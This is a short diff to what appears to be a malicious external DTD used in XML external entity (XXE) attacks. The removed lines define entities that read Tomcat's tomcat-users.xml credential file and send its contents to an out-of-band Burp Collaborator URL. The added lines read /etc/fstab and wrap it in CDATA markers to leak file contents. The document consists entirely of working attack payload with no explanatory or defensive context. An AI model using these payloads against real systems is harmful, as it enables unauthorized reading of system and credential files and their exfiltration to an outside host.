@@ -1,4 +1,5 @@
-<!ENTITY % file SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://pb4tzly2yb2agphpqgkot4jdz45wtl.burpcollaborator.net/?x=%00%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents 
+'%start;%file;%end;'>">
